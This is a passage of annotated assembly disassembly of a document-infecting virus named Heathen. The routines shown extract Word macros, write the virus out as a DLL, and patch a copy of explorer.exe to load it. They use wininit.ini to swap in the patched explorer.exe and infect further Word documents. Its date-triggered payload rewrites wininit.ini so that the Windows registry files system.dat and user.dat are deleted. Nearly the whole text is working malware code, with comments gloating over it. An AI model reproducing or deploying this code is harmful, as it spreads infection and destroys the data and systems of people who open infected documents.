  lea	eax, [ebp+WINDOWS_HeathenVDO]
  add	ecx, ebx
  push	ecx
  push	eax
  call	[ebp+APIs.lstrcatA] ; c:windowsHeathen.vdo
  mov	edx, offset aWininit_ini
  lea	ecx, [ebp+WINDOWS_WininitINI]
  add	edx, ebx
  push	edx
  push	ecx
  call	[ebp+APIs.lstrcatA] ; c:windowsWininit.ini
  lea	eax, [ebp+WINDOWS_HtmpDOC]
  push	0	    ; overwrite	Htmp.doc if already present
  push	eax
  xor	esi, esi    ; ESI = 0 =	File errors
  push	[ebp+ActiveDocument]
  call	[ebp+APIs.CopyFileA] ; copy file: ActiveDocument --> c:windowsHtmp.doc
  test	eax, eax
  jz	error1	    ; error
  lea	edx, [ebp+UNICODE_HtmpDoc]
  push	edx
  lea	ecx, [ebp+WINDOWS_HtmpDOC]
  push	ecx
  call	asciiz_to_unicode ; convert c:windowsHtmp.doc	to unicode
  add	esp, 8
  lea	eax, [ebp+IStorage1]
  push	eax	    ; &IStorage1
  push	0	    ; zero (reserved)
  push	0	    ; NULL
  push	10h	    ; STGM_READ	+ STGM_SHARE_EXCLUSIVE
  push	0	    ; NULL
  lea	edx, [ebp+UNICODE_HtmpDoc] ; file to contain Storage object
  push	edx
  call	[ebp+APIs.StgOpenStorage] ; open IStorage1 object
  mov	edi, eax
  test	edi, edi
  jnz	error2	    ; error
  lea	eax, [ebp+UNICODE_HeathenVdo]
  push	eax
  lea	edx, [ebp+WINDOWS_HeathenVDO]
  push	edx
  call	asciiz_to_unicode ; convert c:windowsHeathen.Vdo to unicode
  add	esp, 8
  lea	ecx, [ebp+IStorage2]
  push	ecx	    ; &IStorage2
  push	0	    ; zero (reserved)
  push	1011h	    ; STGM_CREATE + STGM_SHARE_EXCLUSIVE + STGM_WRITE
  lea	eax, [ebp+UNICODE_HeathenVdo] ;	compound file to create
  push	eax
  call	[ebp+APIs.StgCreateDocFile] ; create newcompound IStorage2 object
  mov	edi, eax
  test	edi, edi
  jnz	error3	    ; error
  lea	eax, [ebp+IStream1]
  mov	edi, offset aWorddocument ; WordDocument stream
  push	eax	    ; &Istream1
  push	0	    ; zero (reserved)
  push	10h	    ; STGM_SHARE_EXCLUSIVE
  add	edi, ebx
  push	0	    ; zero (reserved)
  push	edi	    ; name of the stream
  mov	edx, [ebp+IStorage1]
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStorage_Interface.OpenStream] ; open WordDocument	stream
  push	0	    ; NULL = dont return actual	number of bytes	read
  lea	eax, [ebp+Buffer]
  push	200h	    ; number of	bytes to read
  push	eax	    ; buffer for read
  mov	edx, [ebp+IStream1]
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStream_Interface.Read] ; read WordDocument Header
  mov	eax, offset xTable
  mov	dx, 31h	    ; "1Table"
  add	eax, ebx
  mov	[ebp+xTable], eax
  test	[ebp+Buffer+0Bh], 2 ; fWhichTblStm bit
		    ; 0	= use 0Table for read
		    ; 1	= use 1Table for read
  jnz	short use1Table
  dec	edx	    ; "0Table"

use1Table:
  mov	ecx, [ebp+xTable]
  mov	[ecx], dx
  mov	eax, dword ptr [ebp+Buffer+15Ah] ; fcCmds = offset in xTable stream of macros
  mov	[ebp+MacrosOffset], eax
  mov	edx, dword ptr [ebp+Buffer+15Eh] ; lcbCmds = size of macros
  mov	[ebp+MacrosSize], edx
  mov	ecx, [ebp+IStream1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Release]	; close	stream
  cmp	[ebp+MacrosSize], 200h ; greater than 200h?
  jg	error4
  lea	edx, [ebp+IStream1] ; open another stream (previous one	was closed)
  push	edx	    ; &IStream1
  push	0	    ; zero (reserved)
  push	10h	    ; STGM_SHARE_EXCLUSIVE
  push	0	    ; zero (reserved)
  push	[ebp+xTable] ; name of stream: "0Table"	or "1Table"
  mov	ecx, [ebp+IStorage1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStorage_Interface.OpenStream] ; open Table stream
  mov	eax, [ebp+MacrosOffset]
  cdq
  mov	dword ptr [ebp+StreamSeek], eax
  mov	dword ptr [ebp+StreamSeek+4], edx
  push	0	    ; NULL (dont return	new position)
  push	0	    ; STREAM_SEEK_SET
  push	dword ptr [ebp+StreamSeek+4] ; offset in Table stream
  push	dword ptr [ebp+StreamSeek]
  mov	eax, [ebp+IStream1]
  push	eax
  mov	edx, [eax]
  call	[edx+IStream_Interface.Seek] ; Seek in table stream
  push	0	    ; NULL = dont return actual	number of bytes	read
  lea	ecx, [ebp+Buffer]
  push	[ebp+MacrosSize] ; number of bytes to read
  push	ecx	    ; buffer
  mov	eax, [ebp+IStream1]
  push	eax
  mov	edx, [eax]
  call	[edx+IStream_Interface.Read] ; read macros from	Table stream
  mov	ecx, [ebp+IStream1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Release]	; close	Table stream
  lea	edx, [ebp+IStream1] ; lets use same variable for another stream	 :-)
  push	edx	    ; &IStream1
  push	0	    ; zero (reserved)
  push	0	    ; zero (reserved)
  push	1011h	    ; STGM_CREATE + STGM_SHARE_EXCLUSIVE + STGM_WRITE
  push	edi	    ; name of stream to	create:	"WordDocument"
  mov	ecx, [ebp+IStorage2]
  push	ecx	    ; &IStorage2 (heathen.vdo)
  mov	eax, [ecx]
  call	[eax+IStorage_Interface.CreateStream] ;	create stream
  mov	edi, eax
  test	edi, edi
  jnz	error4	    ; error
  push	0	    ; NULL = dont return actual	number of bytes	written
  lea	edx, [ebp+Buffer]
  push	[ebp+MacrosSize] ; number of bytes to write
  push	edx
  mov	ecx, [ebp+IStream1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Write] ;	IStream:Write
  mov	edx, [ebp+IStream1]
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStream_Interface.Release]	; close	stream
  mov	eax, offset aMacros ; name of element to move
  add	eax, ebx
  push	1	    ; STGMOVE_COPY (dont move, only copy)
  push	eax
  push	[ebp+IStorage2]	; destination storage object (heathen.vdo)
  push	eax
  mov	edx, [ebp+IStorage1] ; source IStorage Interface (htmp.doc)
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStorage_Interface.MoveElementTo] ; move macros
  mov	edi, eax
  test	edi, edi
  jnz	short error4
  push	0	    ; NULL
  push	20h	    ; FILE_ATTRIBUTE_ARCHIVE
  push	2	    ; CREATE_ALWAYS
  push	0	    ; NULL = handle cannot be inherited
  push	0	    ; 0	= prevent file from being shared
  lea	eax, [ebp+WINDOWS_HeatheVDL] ; "c:windowsheathen.vdl"
  push	40000000h   ; GENERIC_WRITE
  push	eax
  call	[ebp+APIs.CreateFileA] ; create	DLL file (that will be called from Explorer patch code)
  mov	[ebp+FileHandle], eax
  cmp	[ebp+FileHandle], 0FFFFFFFFh
  jz	short error4 ; file creation error
  push	0	    ; NULL
  lea	edx, [ebp+writtenbytes]
  push	edx
  push	3000h	    ; number of	bytes to write
  push	[ebp+HEATHEN_BASE] ; buffer for	write
  push	[ebp+FileHandle] ; file	handle
  call	[ebp+APIs.WriteFile] ; write virus as a	DLL file  :-D
  mov	edi, eax
  push	[ebp+FileHandle]
  call	[ebp+APIs.CloseHandle] ; close file
  test	edi, edi
  jz	short error4 ; error
  push	0	    ; overwrite	Heathen.vex if already present
  lea	eax, [ebp+WINDOWS_HeathenVEX]
  push	eax
  lea	edx, [ebp+WINDOWS_ExplorerEXE]
  push	edx
  call	[ebp+APIs.CopyFileA] ; copy file: c:windowsexplorer.exe --> c:windowsheathen.vex
  mov	esi, eax    ; ESI = 0  means errors

error4:
  mov	eax, [ebp+IStorage2]
  push	eax
  mov	edx, [eax]
  call	[edx+IStorage_Interface.Release] ; close IStorage2 (heathen.vdo)

error3:
  mov	ecx, [ebp+IStorage1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStorage_Interface.Release] ; close IStorage1 (htmp.doc)

error2:
  lea	edx, [ebp+WINDOWS_HtmpDOC]
  push	edx
  call	[ebp+APIs.DeleteFileA] ; delete	temporary file c:windowsHtmp.doc

error1:
  test	esi, esi    ; errors?
  jz	short error0 ; yes  :-(
  push	[ebp+Patch_code] ; Offset of code to be	inserted in Explorer.exe
  mov	ecx, offset aKernel32_dll
  mov	eax, offset aLoadLibraryA
  add	ecx, ebx
  add	eax, ebx
  push	ecx	    ; "KERNEL32.DLL"
  push	eax	    ; "LoadLibraryA"
  lea	edx, [ebp+WINDOWS_HeathenVEX]
  lea	ecx, [ebp+APIs]	; API addresses
  push	edx
  push	ecx
  call	PatchEXPLORER ;	patch c:windowsHeathen.vex
  add	esp, 14h
  test	eax, eax
  jz	short error0 ; error patching file
  push	ebx	    ; EBX = delta
  lea	eax, [ebp+WINDOWS_HeathenVEX]
  push	eax
  lea	edx, [ebp+WINDOWS_ExplorerEXE]
  push	edx
  lea	ecx, [ebp+WINDOWS_WininitINI]
  push	ecx
  lea	eax, [ebp+APIs]	; API addresses
  push	eax
  call	CreateWININIT ;	create c:windowswininit.ini file to replace explorer.exe
  add	esp, 14h

error0:
  pop	edi
  pop	esi
  pop	ebx
  mov	esp, ebp
  pop	ebp
  retn	1Ch
InstallVIRUS endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

alloc_memory proc near

Size= dword ptr	 8

  push	ebp
  mov	ebp, esp
  mov	eax, ds:MemoryAllocator
  push	[ebp+Size]  ; size of memory to	allocate
  push	eax
  mov	edx, [eax]
  call	[edx+IMalloc_Interface.PreAlloc] ; allocate memory
  pop	ebp
  retn
alloc_memory endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

free_memory proc near

Buffer=	dword ptr  8

  push	ebp
  mov	ebp, esp
  mov	eax, [ebp+Buffer]
  test	eax, eax
  jz	short free_memory0
  push	eax
  mov	eax, ds:MemoryAllocator
  push	eax
  mov	edx, [eax]
  call	[edx+IMalloc_Interface.PreFree]	; free memory

free_memory0:
  pop	ebp
  retn
free_memory endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

AddDirectorytoList proc near

laststruct= dword ptr -4
DirectoryList= dword ptr  8
NewDirectory= dword ptr	 0Ch

  push	ebp
  mov	ebp, esp
  push	ecx
  push	ebx
  push	esi
  push	edi
  mov	edi, [ebp+NewDirectory]	; name of new Directory	to insert on list
  mov	ebx, [ebp+DirectoryList] ; EBX = pointer to structure corresponding to last directory in list
  mov	eax, [ebx]  ; get next directory structure
  mov	[ebp+laststruct], eax ;	next Directory structure
  push	8
  call	alloc_memory ; get memory for new Directory structure
  pop	ecx
  mov	esi, eax
  mov	[ebx], esi  ; save it, so this new structure will be first in chain
  test	esi, esi
  jnz	short AddDirectory
  xor	eax, eax
  jmp	short error50 ;	error allocating memory
; ---------------------------------------------------------------------------

AddDirectory:
  push	edi
  call	API_lstrlenA ; get size	of directory name
  inc	eax
  push	eax
  call	alloc_memory ; reserve memory for that Directory name
  mov	esi, eax
  mov	eax, [ebx]
  pop	ecx
  test	esi, esi
  mov	[eax+DirectorySTRUC.DirectoryName], esi	; save in first	field of structure the name of the directory
  jnz	short AddDirectory2
  xor	eax, eax
  jmp	short error50 ;	error allocating memory
; ---------------------------------------------------------------------------

AddDirectory2:
  push	edi
  push	esi
  call	API_lstrcpyA ; copy directory name to reserved memory
  mov	edx, [ebx]
  mov	ecx, [ebp+laststruct]
  mov	[edx+DirectorySTRUC.NextDirectorySTRUC], ecx ; save next directory structure in	second field of	actual structure
  mov	eax, 1

error50:
  pop	edi
  pop	esi
  pop	ebx
  pop	ecx
  pop	ebp
  retn
AddDirectorytoList endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

DeleteDirectoryfromList proc near

NextDirectorySTRUC= dword ptr  8
DirectoryName= dword ptr  0Ch

  push	ebp
  mov	ebp, esp
  push	ebx
  push	esi
  mov	ebx, [ebp+NextDirectorySTRUC] ;	EBX = pointer to Directory structure
  mov	eax, [ebx]  ; EAX = Directory structure
  mov	esi, [eax+DirectorySTRUC.NextDirectorySTRUC] ; ESI = next directory structure
  push	[eax+DirectorySTRUC.DirectoryName] ; name of the directory (in this directory structure)
  push	[ebp+DirectoryName] ; pointer to argument DirectoryName	(to return name	of directory)
  call	API_lstrcpyA ; copy directory name to argument DirectoryName
  mov	eax, [ebx]
  push	[eax+DirectorySTRUC.DirectoryName]
  call	free_memory ; free memory that contains	the name of the	directory
  pop	ecx
  push	dword ptr [ebx]
  call	free_memory ; free memory of this directory structure
  pop	ecx
  mov	[ebx], esi  ; update DirectoryList
  pop	esi
  pop	ebx
  pop	ebp
  retn
DeleteDirectoryfromList	endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; called from WndProc

PAYLOAD proc near

BytesWritten= byte ptr -518h
WINDOWS_WININIT= byte ptr -514h
STRING_TEXT= byte ptr -3E8h

  push	ebx
  add	esp, 0FFFFFAE8h
  push	offset WindowsDirectory
  lea	eax, [esp+51Ch+WINDOWS_WININIT]
  push	eax
  call	API_lstrcpyA
  push	offset aWininit_ini
  lea	edx, [esp+51Ch+WINDOWS_WININIT]
  push	edx
  call	API_lstrcatA ; "c:windowswininit.ini"
  push	0	    ; NULL
  push	20h	    ; FILE_ATTRIBUTE_ARCHIVE
  push	2	    ; CREATE_ALWAYS
  push	0	    ; NULL = file handle cannot	be inherited
  push	0	    ; 0	= prevent file from being shared
  push	40000000h   ; GENERIC_WRITE
  lea	ecx, [esp+530h+WINDOWS_WININIT]
  push	ecx
  call	API_CreateFileA	; create file
  mov	ebx, eax
  push	offset WindowsDirectory
  push	offset WindowsDirectory
  push	offset WindowsDirectory
  push	offset WindowsDirectory
  push	offset aRename
  push	offset aRename2
  lea	eax, [esp+530h+STRING_TEXT]
  push	eax
  call	API_wsprintfA ;	generate following text...
		    ; [rename]
		    ; nul=c:windowssystem.dat
		    ; nul=c:windowsuser.dat
		    ; nul=c:windowssystem.da0
		    ; nul=c:windowsuser.da0
		    ;
  add	esp, 1Ch
  push	0	    ; NULL
  lea	edx, [esp+51Ch+BytesWritten]
  push	edx	    ; pointer to store number of bytes actually	written	to file
  lea	ecx, [esp+520h+STRING_TEXT]
  push	ecx
  call	API_lstrlenA ; get size	of the string
  push	eax	    ; number of	bytes to write
  lea	eax, [esp+524h+STRING_TEXT]
  push	eax	    ; text
  push	ebx	    ; file handle
  call	API_WriteFile ;	write to wininit.ini
  push	ebx
  call	API_CloseHandle	; close	file handle
  add	esp, 518h
  pop	ebx
  retn
PAYLOAD	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


InitVariables proc near

IStorage1= byte	ptr -1A4h
FilePointer= qword ptr -1A0h
WINDOWS_HeathenVDO= byte ptr -198h
StatSTG= dword ptr -6Ch
IStorageTime= word ptr -24h
SystemTime= word ptr -14h

  push	ebx
  add	esp, 0FFFFFE60h
  xor	ebx, ebx
  push	12Ch
  push	offset WindowsDirectory
  call	API_GetWindowsDirectoryA ; get windows directory
  push	offset WindowsDirectory
  lea	eax, [esp+1A8h+WINDOWS_HeathenVDO]
  push	eax
  call	API_lstrcpyA
  push	offset aHeathen_vdo
  lea	edx, [esp+1A8h+WINDOWS_HeathenVDO]
  push	edx
  call	API_lstrcatA ; "c:windowsHeathen.vdo"
  push	offset UNICODE_HeathenVDO
  lea	ecx, [esp+1A8h+WINDOWS_HeathenVDO]
  push	ecx
  call	asciiz_to_unicode ; convert it to unicode (for use by OLE functions)
  add	esp, 8
  push	esp	    ; &IStorage1
  push	0	    ; zero (reserved)
  push	0	    ; NULL
  push	10h	    ; STGM_READ	+ STGM_SHARE_EXCLUSIVE
  push	0	    ; NULL
  push	offset UNICODE_HeathenVDO
  call	API_StgOpenStorage ; open Storage heathen.vdo
  test	eax, eax
  jnz	error20
  push	offset ILockBytes ; where ILockBytes interface is returned
  push	1	    ; TRUE = free handle when object is	released
  push	0	    ; NULL = allocate a	new shared memory block	of size	zero
  call	API_CreateILockBytesOnHGlobal ;	create a byte array object that	allows to use global memory as the physical device (instead of disk file)
  test	eax, eax
  jnz	error21
  push	offset IStorage	; &IStorage
  push	0	    ; NULL
  push	1012h	    ; STGM_CREATE + STGM_SHARE_EXCLUSIVE + STGM_READWRITE
  push	ds:ILockBytes ;	ILockBytes interface on	the byte array object
  call	API_StgCreateDocfileOnILockBytes ; creates a new COM file storage object on top	of the byte array object
  test	eax, eax
  jnz	error21
  push	ds:IStorage ; destination IStorage (on memory)
  push	0	    ; NULL
  push	0	    ; NULL=all objects to be copied
  push	0	    ; NULL
  mov	eax, dword ptr [esp+1B4h+IStorage1]
  push	eax	    ; source IStorage (heathen.vdo)
  mov	edx, [eax]
  call	[edx+IStorage_Interface.CopyTo]	; copy all its contents
  test	eax, eax
  jnz	short error21
  push	offset IStream ; &IStream
  push	0	    ; zero (reserved)
  push	10h	    ; STGM_SHARE_EXCLUSIVE
  push	0	    ; zero (reserved)
  push	offset aWorddocument ; WordDocument stream (where virus	macros were stored)
  mov	ecx, ds:IStorage
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStorage_Interface.OpenStream] ; open that	stream
  test	eax, eax
  jnz	short error21
  mov	dword ptr [esp+1A4h+FilePointer], 0
  mov	dword ptr [esp+1A4h+FilePointer+4], 0
  push	offset HeathenMacrosSize ; here	will be	stored size of WordDocument stream, that contains virus	macros!!!
  push	2	    ; STREAM_SEEK_END
  push	dword ptr [esp+1ACh+FilePointer+4]
  push	dword ptr [esp+1B0h+FilePointer]
  mov	ecx, ds:IStream
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Seek] ; seek at end of stream = size of stream
  push	0	    ; NULL (dont return	new position)
  push	0	    ; STREAM_SEEK_SET
  push	dword ptr [esp+1ACh+FilePointer+4]
  push	dword ptr [esp+1B0h+FilePointer]
  mov	ecx, ds:IStream
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Seek] ; seek at start of	stream
  mov	ebx, 1	    ; ok, no errors  :)

error21:
  push	1	    ; STATFLAG_NONAME
  lea	eax, [esp+1A8h+StatSTG]
  push	eax	    ; &StatSTG
  mov	edx, dword ptr [esp+1ACh+IStorage1] ; heathen.vdo storage
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStorage_Interface.Stat] ;	get stat structure of the IStorage
  lea	eax, [esp+1A4h+IStorageTime] ; variable	to store IStorage modification time (converted to SystemTime)
  push	eax
  lea	edx, [esp+1A8h+StatSTG+10h] ; mtime = modification time
  push	edx
  call	API_FileTimeToSystemTime ; converts a 64-bit file time to system time format
  lea	ecx, [esp+1A4h+SystemTime] ; &SystemTime
  push	ecx
  call	API_GetSystemTime ; get	system time
  movzx	eax, [esp+1A4h+SystemTime+6] ; System day
  movzx	edx, [esp+1A4h+IStorageTime+6] ; IStorage day
  sub	eax, edx    ; day difference
  movzx	edx, [esp+1A4h+IStorageTime+2] ; IStorage month
  movzx	ecx, [esp+1A4h+SystemTime+2] ; System month
  sub	ecx, edx    ; month difference
  imul	ecx, 1Eh    ; *	30 days/month
  add	eax, ecx    ; add days
  movzx	ecx, [esp+1A4h+IStorageTime] ; IStorage	year
  movzx	edx, [esp+1A4h+SystemTime] ; System year
  sub	edx, ecx    ; year difference
  imul	edx, 16Dh   ; *	365 days/year
  add	eax, edx    ; add days
  cmp	eax, 183    ; 183 days (or more) since installation? (half a year)
  setnl	al
  and	eax, 1	    ; EAX=1--> yes!  :-D
  cmp	[esp+1A4h+SystemTime+6], 0Eh ; day 14?
  mov	ds:MoreThanHalfYear, eax
  jnz	short not_may14th ; no
  cmp	[esp+1A4h+SystemTime+2], 5 ; month = May?
  jz	short month14th	; yes

not_may14th:
  xor	ecx, ecx
  jmp	short is_may14th
; ---------------------------------------------------------------------------

month14th:
  mov	ecx, 1

is_may14th:
  mov	ds:may14h, ecx ; indicate if we	are on may 14th
  mov	eax, dword ptr [esp+1A4h+IStorage1]
  push	eax
  mov	edx, [eax]
  call	[edx+IStorage_Interface.Release] ; close IStorage

error20:
  mov	eax, ebx
  add	esp, 1A0h
  pop	ebx
  retn
InitVariables endp


; --------------- S U B	R O U T	I N E ---------------------------------------


InitDirectoryList proc near

IStream1= dword	ptr -1Ch
Zero_Offset= qword ptr -18h
ScanDataSize= byte ptr -10h

  push	ebx
  push	esi
  add	esp, 0FFFFFFECh
  xor	eax, eax
  mov	ds:Drive, eax ;	empty DirectoryList
  xor	edx, edx
  mov	ds:DirectoryList.NextDirectorySTRUC, edx
  mov	ds:DirectoryList.DirectoryName,	edx
  push	esp	    ; &IStream1
  push	0	    ; zero (reserved)
  push	10h	    ; STGM_SHARE_EXCLUSIVE
  push	0	    ; zero (reserved)
  push	offset aScandata ; name	of stream "ScanData"
  mov	eax, ds:IStorage ; (IStorage based on ILockBytes interface)
  push	eax
  mov	ecx, [eax]
  call	[ecx+IStorage_Interface.OpenStream] ; open stream ScanData
  test	eax, eax
  jnz	error40	    ; error
  mov	dword ptr [esp+1Ch+Zero_Offset], 0 ; offset from end of	stream = 0
  mov	dword ptr [esp+1Ch+Zero_Offset+4], 0
  lea	eax, [esp+1Ch+ScanDataSize]
  push	eax
  push	2	    ; STREAM_SEEK_END
  push	dword ptr [esp+24h+Zero_Offset+4]
  push	dword ptr [esp+28h+Zero_Offset]
  mov	ecx, [esp+2Ch+IStream1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Seek] ; seek to end of stream to	calculate its size
  push	0	    ; NULL (dont return	new position)
  push	0	    ; STREAM_SEEK_SET
  push	dword ptr [esp+24h+Zero_Offset+4]
  push	dword ptr [esp+28h+Zero_Offset]
  mov	ecx, [esp+2Ch+IStream1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Seek] ; go to start of stream
  push	dword ptr [esp+1Ch+ScanDataSize] ; size	of actual ScanData
  call	alloc_memory ; reserve memory for those	structures
  pop	ecx
  mov	esi, eax
  test	esi, esi
  jz	short error41 ;	error allocating memory
  push	0
  push	dword ptr [esp+20h+ScanDataSize] ; size	of ScanData
  push	esi	    ; buffer
  mov	eax, [esp+28h+IStream1]
  push	eax
  mov	edx, [eax]
  call	[edx+IStream_Interface.Read] ; read SCanData
  mov	ecx, [esi]  ; get disk drive od	Directory where	it was stopped
  mov	ds:Drive, ecx ;	save it	to continue in that Directory
  lea	ebx, [esi+4]
  jmp	short CreateList
; ---------------------------------------------------------------------------

CreateList2:
  push	ebx	    ; offset of	directory name
  push	offset DirectoryList ; directory list
  call	AddDirectorytoList ; add this directory	to DirectoryList
  add	esp, 8
  test	eax, eax
  jz	short error42 ;	exit on	error
  push	ebx
  call	API_lstrlenA ; get size	of directory name
  inc	eax
  add	ebx, eax    ; point to next directory

CreateList:
  cmp	dword ptr [ebx], 0FFFFFFFFh ; end of Directories?
  jnz	short CreateList2 ; not	yet

error42:
  push	esi
  call	free_memory ; free memory of ScanData, although	DirectoryList structures remain	in memory to work with them
  pop	ecx

error41:
  mov	eax, [esp+1Ch+IStream1]
  push	eax
  mov	edx, [eax]
  call	[edx+IStream_Interface.Release]	; close	stream

error40:
  add	esp, 14h
  pop	esi
  pop	ebx
  retn
InitDirectoryList endp


; --------------- S U B	R O U T	I N E ---------------------------------------


UpdateScanData proc near

IStorage= dword	ptr -13Ch
IStream_ScanData= dword	ptr -138h
EndMark= byte ptr -134h
DirectoryName= byte ptr	-130h

  push	ebx
  add	esp, 0FFFFFEC8h
  push	esp	    ; &IStorage	(esp+13Ch+IStorage)
  push	0	    ; zero (reserved)
  push	0	    ; NULL
  push	11h	    ; STGM_WRITE + STGM_SHARE_EXCLUSIVE
  push	0	    ; NULL
  push	offset UNICODE_HeathenVDO
  call	API_StgOpenStorage ; open Storage heathen.vdo
  mov	ebx, eax    ; EBX = 0 if no errors
  test	ebx, ebx
  jnz	error60
  lea	eax, [esp+13Ch+IStream_ScanData] ; &Istream_ScanData
  push	eax
  push	0	    ; zero (reserved)
  push	0	    ; zero (reserved)
  push	1011h	    ; STGM_CREATE + STGM_SHARE_EXCLUSIVE + STGM_WRITE
  push	offset aScandata ; name	of stream
  mov	edx, [esp+150h+IStorage]
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStorage_Interface.CreateStream] ;	open SCanData stream
  mov	ebx, eax
  test	ebx, ebx
  jnz	short error62
  mov	dword ptr [esp+13Ch+EndMark], 0FFFFFFFFh ; indicate "end of directories"
  push	0	    ; NULL = not interested in number of bytes actually	written	to stream
  push	4	    ; number of	bytes to write to stream
  push	offset Drive ; drive unit that we are currently	scanning
  mov	eax, [esp+148h+IStream_ScanData]
  push	eax
  mov	edx, [eax]
  call	[edx+IStream_Interface.Write] ;	IStream:Write
  or	ebx, eax    ; if errors, EBX will be different of zero
  jmp	short check_more_directories
; ---------------------------------------------------------------------------

get_more_directories:
  lea	ecx, [esp+13Ch+DirectoryName]
  push	ecx
  push	offset DirectoryList
  call	DeleteDirectoryfromList	; get next directory from list (and free it from list)
  add	esp, 8
  push	0	    ; NULL = not interested in number of bytes actually	written	to stream
  lea	eax, [esp+140h+DirectoryName]
  push	eax
  call	API_lstrlenA
  inc	eax	    ; one byte more, to	include	be an ASCIIZ string
  push	eax	    ; number of	bytes to write to stream
  lea	edx, [esp+144h+DirectoryName] ;	name of	directory
  push	edx
  mov	ecx, [esp+148h+IStream_ScanData]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Write] ;	write directory	name to	stream
  or	ebx, eax

check_more_directories:
  cmp	ds:DirectoryList.DirectoryName,	0 ; more directories in	List?
  jnz	short get_more_directories ; yeah! go for them!
  push	0	    ; NULL = not interested in number of bytes actually	written	to stream
  push	4	    ; number of	bytes to write to stream
  lea	edx, [esp+144h+EndMark]	; offset of 0xFFFFFFFF to be written at	end of directories
  push	edx
  mov	ecx, [esp+148h+IStream_ScanData]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Write] ;	write mark
  or	ebx, eax
  mov	edx, [esp+13Ch+IStream_ScanData] ; IStream
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStream_Interface.Release]	; close	stream

error62:
  test	ebx, ebx
  jz	short error61 ;	jump if	no errors!
  mov	eax, [esp+13Ch+IStorage]
  push	eax
  mov	edx, [eax]
  call	[edx+IStorage_Interface.Revert]	; discard all changes!!!

error61:
  mov	ecx, [esp+13Ch+IStorage]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStorage_Interface.Release] ; close IStorage

error60:
  add	esp, 138h
  pop	ebx
  retn
UpdateScanData endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

InfectDocument proc near

Buffer=	byte ptr -4BCh
STATG= STATG_STRUC ptr -2BCh
UNICODE_FILENAME= byte ptr -274h
MacrosOffset= dword ptr	-1Ch
SeekOffset= qword ptr -14h
IStream2= dword	ptr -0Ch
IStream1= dword	ptr -8
IStorage1= dword ptr -4
ASCIIZ_FILENAME= dword ptr  8

  push	ebp
  mov	ebp, esp
  add	esp, 0FFFFFB44h
  cmp	ds:may14h, 0 ; may 14th?
  push	ebx
  push	esi
  mov	ebx, [ebp+ASCIIZ_FILENAME]
  jz	short Infect_This_File ; jump if not may 14th
  xor	ecx, ecx
  xor	eax, eax
  jmp	short check_directory_name
; ---------------------------------------------------------------------------

next_character:
  movsx	edx, dl
  cmp	edx, ''
  jnz	short next_character2
  lea	ecx, [eax+1] ; ECX = offset after ""  (offset of name of subdirectory or file)

next_character2:
  inc	eax	    ; next byte

check_directory_name:
  mov	dl, [ebx+eax]
  test	dl, dl
  jnz	short next_character ; search to end of	directory name
  movsx	eax, byte ptr [ebx+ecx]	; get first character of subdirectory name
  cmp	eax, '_'
  jz	short Infect_This_File ; on mat	14th...	only infects files starting with "_" !!!
  xor	eax, eax
  jmp	error70
; ---------------------------------------------------------------------------

Infect_This_File:
  xor	esi, esi    ; ESI = 0  means infection not successful
  lea	eax, [ebp+UNICODE_FILENAME]
  push	eax
  push	ebx
  call	asciiz_to_unicode ; convert it to unicode string
  add	esp, 8
  lea	edx, [ebp+IStorage1] ; &IStorage
  push	edx
  push	0	    ; zero (reserved)
  push	0	    ; NULL
  push	12h	    ; STGM_READWRITE + STGM_SHARE_EXCLUSIVE
  push	0	    ; NULL
  lea	ecx, [ebp+UNICODE_FILENAME]
  push	ecx
  call	API_StgOpenStorage ; open document
  test	eax, eax
  jnz	error71	    ; exit on error
  push	1
  lea	eax, [ebp+STATG] ; where STATG structured will be returned
  push	eax
  mov	edx, [ebp+IStorage1] ; IStorage	of the document
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStorage_Interface.Stat] ;	get STATG structure for	this storage object
  lea	eax, [ebp+IStream1] ; &IStream1
  push	eax
  push	0	    ; zero (reserved)
  push	12h	    ; STGM_READWRITE + STGM_SHARE_EXCLUSIVE
  push	0	    ; zero (reserved)
  push	offset aWorddocument ; name of stream "WordDocument"
  mov	edx, [ebp+IStorage1]
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStorage_Interface.OpenStream] ; open stream
  test	eax, eax
  jnz	error72
  push	0	    ; NULL = not interested in number of bytes actually	read from stream
  lea	eax, [ebp+Buffer]
  push	200h	    ; number of	bytes to read
  push	eax	    ; buffer
  mov	edx, [ebp+IStream1] ; IStream
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStream_Interface.Read] ; read WordDocument header
  cmp	dword ptr [ebp+Buffer+15Eh], 3
  jge	error73	    ; exit if it already has macros
  mov	ax, 31h	    ; select 1Table
  test	[ebp+Buffer+0Bh], 2 ; 0Table or	1Table?
  jnz	short select_1Table
  dec	eax	    ; select 0Table

select_1Table:
  mov	word ptr ds:xTable, ax
  lea	edx, [ebp+IStream2] ; &IStream2
  push	edx
  push	0	    ; zero (reserved)
  push	11h	    ; STGM_WRITE + STGM_SHARE_EXCLUSIVE
